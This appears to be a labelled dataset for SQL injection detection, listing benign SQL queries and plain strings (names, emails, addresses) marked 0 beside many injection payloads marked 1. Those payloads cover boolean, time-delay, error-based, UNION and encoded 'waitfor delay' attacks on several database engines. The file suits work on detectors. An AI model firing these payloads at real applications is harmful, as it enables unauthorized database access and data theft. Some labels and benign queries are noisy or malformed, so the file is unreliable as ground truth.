Payload	Attacker
"-5196""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""gbcq"" like ""gbcq"	1
SELECT * FROM honor 3	0
telema	0
  SELECT centID AS ID, becoming AS tank FROM decide	0
#NAME?	0
manda	0
   SELECT Employees.report, COUNT ( Orders.withinID )  AS thingFROM    ( OrdersINNER JOIN cookies ON Orders.hunterID  =  Employees.shownID ) 	0
SELECT * FROM large  WHERE see NOT LIKE '[mysterious]%'	0
70132648j	0
alh4a3	0
descapotar	0
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1'	1
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11451 )  ORDER BY meta_id ASC	0
1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  	1
   SELECT low,bound,develop,kill,older     (  (  string JOIN beyond ON youth.speed =  studying.bend )   INNER JOIN masterON Orders.feel =  greatly.trackID ) 	0
SELECT * FROM anywhere WHERE one NOT LIKE '[attack]%'	0
1'   )    )    as egsj where 3447  =  3447	1
sellees	0
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  "	1
6554	0
SELECT * FROM told WHERE needed  BETWEEN 10 AND 20	0
batllori budi	0
10302390t	0
  SELECT business,meal FROM happen WHERE swing = 'mind' UNION SELECT cheese, toward FROM rod	0
29807509s	0
1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --	1
lim@marketingmunicipal.bf	0
SELECT * FROM park WHERE tried  BETWEEN 10 AND 20	0
SELECT * FROM building WHERE shout NOT BETWEEN 'she' AND 'round'	0
SELECT AVG ( plane )  FROM weather  SELECT SUM ( life ) 	0
SELECT MIN ( brown )  AS forget FROM thirty	0
1'||  (  select 'ufgs' where 9670  =  9670 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'	1
1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo	1
cmitre	0
   SELECT Employees.continent, COUNT ( Orders.parentID )  AS settingFROM    ( OrdersINNER JOIN more ON Orders.shadeID  =  Employees.wheatID ) 	0
SELECT * FROM low WHERE thee NOT BETWEEN 'enjoy' AND 'factor'	0
1' where 8635  =  8635 order by 1--	1
 select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1	1
 SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country AS Address  FROM Customers;	0
1'+  (  select 'vjoj' where 5348  =  5348	1
1' rlike sleep  (  5  )   and 'cugs'  =  'cugs	1
SELECT thumb ( s )  FROM complex LEFT JOIN	0
INSERT INTO to  ( daughter, seldom, being )  VALUES  ( 'forward', 'charge', 'next' )  	0
SELECT COUNT ( DISTINCT six )  FROM enemy	0
caterina	0
"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""dplf"" like ""dplf"	1
  SELECT careful,within,is FROM morning LEFT JOIN Orders ON atom.coachID =  guard.whatever ORDER BY would.under	0
SELECT TOP 3 * FROM reader WHERE factory = 'earth'	0
rosa	0
SELECT * FROM report WHERE NOT listen = 'enter'  AND NOT favorite = 'right'	0
SELECT * FROM kids WHERE avoid BETWEEN '1996-07-01' AND '1996-07-31'	0
-5810 union all select 6307,6307,6307,6307,6307,6307,6307--	1
1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  	1
1%'  )   union all select null,null,null,null,null,null,null,null,null--	1
2614	0
SELECT * FROM family WHERE national = 'note'  OR her = 'burn'	0
-9358' or 9887  =  2569--	1
28011073v	0
SELECT nearest ( s FROM apartment RIGHT JOIN	0
1'+  (  select 'sbvh' where 8539  =  8539 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'	1
14638777j	0
-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--	1
1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280	1
SELECT bow ( s )  FROM chief SELECT right FROM word	0
select   (  case when   (  3677  =  2193  )   then 3677 else 1/  (  select 0  )   end  )  --	1
  SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card	0
SELECT AVG ( balloon ) FROM stream	0
SELECT * FROM dull WHERE NOT numeral = 'smile'  AND NOT stared = 'way'	0
cossovel-heintel@camiones-hibridos.ec	0
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'nfix'  =  'nfix	1
SELECT TOP 3 * FROM lake WHERE correct = 'him' SELECT * FROM tube	0
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1"	1
SELECT MIN ( air )  AS refer FROM refused	0
-8876'   )    )    or 3038  =  3038	1
  SELECT * FROM daily WHERE verb IN  ( 'club', 'beyond', 'mud' )  	0
SELECT TOP 50 PERCENT * FROM prepare	0
1 and 9412  =  6877#	1
91553356q	0
1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  	1
artigas girut	0
   SELECT Employees.surrounded, COUNT ( Orders.exclaimedID )  AS rushFROM    ( OrdersINNER JOIN accurate ON Orders.herselfID  =  Employees.sitID ) 	0
   SELECT evening,disappear,planet,pony,plain     (  (  ability JOIN teeth ON beauty.stopped =  high.duty )   INNER JOIN volumeON Orders.bite =  meant.watchID ) 	0
vildo@prensahp.fj	0
sorts bransuel	0
   SELECT Employees.number, COUNT ( Orders.dailyID )  AS incomeFROM    ( OrdersINNER JOIN purple ON Orders.dependID  =  Employees.passageID ) 	0
SELECT * FROM post ORDER BY swimming DESC	0
SELECT * FROM spider WHERE express = 'improve'  AND  ( wonderful = 'battle' OR gradually = 'west' ) 	0
SELECT * FROM zero FETCH FIRST 3 ROWS ONLY	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13641 )  ORDER BY meta_id ASC	0
  SELECT * FROM meet WHERE press IN  ( 'original', 'individual', 'firm' )  	0
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --"	1
SELECT * FROM sharp WHERE cool = 'start' LIMIT 3	0
raspar	0
SELECT * FROM struggle  WHERE tea = forest	0
SELECT MIN ( mile )  AS class FROM careful	0
SELECT paragraph ( s FROM fourth RIGHT JOIN	0
1  )   where 5598  =  5598 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
7242	0
SELECT * FROM limited FETCH FIRST 50 PERCENT ROWS ONLY	0
1%'   )    )     )   union all select null,null,null,null,null,null--	1
60578448j	0
1'+  (  select 'arqt' where 2336  =  2336 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
21%	1
-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#	1
SELECT AVG ( train ) FROM park	0
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps"	1
SELECT chance ( s )  FROM in SELECT worker ( s ) 	0
SELECT * FROM group WHERE figure = 'vapor' LIMIT 3	0
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1	1
"-7749"" or   (  2689  =  7481  )  *7481"	1
priaranza del bierzo	0
  SELECT quick AS impossible, chance AS [ability]  FROM breakfast	0
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) 	1
ayat rozas	0
SELECT COUNT ( top ) FROM broken	0
42010181z	0
SELECT * FROM church FETCH FIRST 50 PERCENT ROWS ONLY	0
"1""  )   where 7919  =  7919 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --"	1
1   )    )    as mmby where 3990  =  3990 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --	1
9195	0
7930750000000000	0
SELECT * FROM six WHERE needs = 'pleasant'  AND City = 'breathe'	0
trese	0
7686270000000000	0
"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --"	1
1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT * FROM loose WHERE depth = 'attention' FETCH FIRST 3 ROWS ONLY	0
04or2ativ1	0
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
SELECT TOP 3 * FROM article WHERE expression = 'alphabet'	0
lesaca clar	0
31594	0
1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--	1
c/ oblit 76	0
FROM  ( SELECT DISTINCT choice FROM event ) 	0
 SELECT * FROM quarter ORDER BY sold ASC, flew DESC	0
 )    )    or sleep  (  __TIME__  )    =  '	1
50491	0
"-9661""   )    )     )   union all select 2158,2158,2158--"	1
cabildeo	0
"SELECT SUBDATE ( ""2017-06-15 09:34:21"", INTERVAL 15 MINUTE ) ;"	0
SELECT * FROM effect WHERE laugh = 'warm' FETCH FIRST 3 ROWS ONLY	0
corazones 168	0
-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--	1
iif  (  1157  =  4542,1,1/0  )  	1
"1""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --"	1
"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""atlz""  =  ""atlz"	1
hendrika@kayaalicante.sc	0
muduex	0
me73ga	0
calle can bordoi, 148	0
1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  	1
"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb"	1
1   )    )    as qfnu where 1609  =  1609 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT * FROM rule WHERE seeing BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM port FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM forgotten	0
chinarro	0
SELECT * FROM sad 3	0
INSERT INTO truck ( laid, map, divide, unknown, trail, blood )  VALUES  ( 'seeing', 'activity'. zebra', 'stiff', 'remember', 'fierce', 'at' )  	0
SELECT why ( s )  FROM just FULL OUTER JOIN	0
SELECT AVG ( Price ) FROM hand	0
1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989	1
-8010' or   (  2225  =  8491  )  *8491 and 'eipf'  =  'eipf	1
  SELECT direction,engine FROM kitchen WHERE want = 'yes' UNION SELECT shut, even FROM behavior	0
strock	0
SELECT * FROM energy WHERE alive = 'arm'  OR cross = 'track'	0
   SELECT moon, wave, behaviorFROM religious WHERE table  IS NOT NULL	0
SELECT * FROM indicate WHERE NOT space = 'noon'  AND NOT log = 'dear'	0
1oca	0
SELECT bigger ( s )  FROM mighty UNION ALL	0
SELECT AVG ( closely )  FROM thank  SELECT SUM ( knowledge ) 	0
lotera	0
-2817  )   where 1212  =  1212 or 3266  =  1102	1
brownfie	0
3947	0
SELECT flow FROM beneath UNION SELECT composition FROM shelf ORDER BY clearly	0
  SELECT * FROM moment WHERE office IN  ( 'during', 'our', 'mood' )  	0
SELECT * FROM hour FETCH FIRST 3 ROWS ONLY	0
-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#	1
vilanova de arousa	0
SELECT AVG ( inside ) FROM proper SELECT SUM ( settlers ) 	0
1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--	1
6121370000000000	0
1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'hllf'  =  'hllf	1
1  )   as jqbv where 8172  =  8172 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1"	1
magalia	0
1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg	1
c/ manresa 56 2-e	0
1'   )    )    as joco where 2922  =  2922	1
SELECT AVG ( rate ) FROM another SELECT SUM ( addition ) 	0
SELECT TOP 3 * FROM sent SELECT * FROM evening 3SELECT * FROM cloud	0
0x77616974666F722064656C61792027303A303A313027 ...	1
SELECT TOP 3 * FROM idea	0
"1%""  )   or sleep  (  5  )   and   (  ""%""  =  """	1
lovejoy	0
SELECT * FROM wp_posts WHERE ID  =  347686 LIMIT 1	0
SELECT TOP 3 * FROM chart WHERE moment = 'house' SELECT * FROM nearly	0
FROM  ( SELECT DISTINCT sale FROM search ) 	0
torre de arcas	0
alberite de san juan	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #	1
1860000000000000	0
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""cgps"" like ""cgps"	1
SELECT * FROM cause WHERE atomic = 'plural'	0
1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #	1
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw"	1
SELECT * FROM never WHERE settle NOT LIKE 'organized%'	0
villavendimio	0
SELECT AVG ( oil ) FROM happen	0
1'  )   as jrqh where 6204  =  6204 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #	1
stalin	0
obdulio	0
-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--	1
6285980000000000	0
SELECT * FROM hospital WHERE series = 'stay'	0
"SELECT * FROM accurate WHERE age BETWEEN ""sat"" AND    ""basis"""	0
2457460000000000	0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) 	1
calle licurgo, 39	0
"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""ajuh""  =  ""ajuh"	1
SELECT * FROM flight WHERE becoming BETWEEN 'copper' AND 'yard'	0
SELECT * FROM wp_posts WHERE ID  =  239190 LIMIT 1	0
1  )   and 3659  =  5475 and   (  8949  =  8949	1
SELECT * FROM dig WHERE column = 'human'	0
SELECT * FROM earlier WHERE write = 'oxygen'  OR wool = 'lie'	0
1'||  (  select 'nvrq' from dual where 4337  =  4337 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
SELECT COUNT ( main ) FROM compound	0
SELECT MIN ( buy )  AS forty FROM whom	0
1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --	1
1  )   as mtda where 3951  =  3951	1
SELECT * FROM port WHERE goes NOT BETWEEN 'some' AND 'underline'	0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec"	1
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  '%'  =  '	1
-4595'  )   where 4892  =  4892 order by 1--	1
96to3a38	0
6819240000000000	0
empel6tarse	0
1%'   )    )    and 1651  =  9324 and    (    (   '%'  =  '	1
SELECT COUNT ( able ) FROM constantly	0
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5fbcf5ac6f5bc' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1	0
SELECT TOP 50 PERCENT * FROM map SELECT * FROM shown FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grown	0
orera	0
SELECT TOP 3 * FROM author WHERE house = 'stop' SELECT * FROM education	0
1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
"-3035""  )   union all select 7912,7912,7912#"	1
SELECT * FROM actually WHERE movie = 'paint'	0
duilio	0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""pxbk"" like ""pxbk"	1
SELECT * FROM turn WHERE massage = 'western'  AND  ( troops = 'everyone' OR women = 'expression' ) 	0
c/ padre ignacio ellaguria, 117 6-e	0
1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba	1
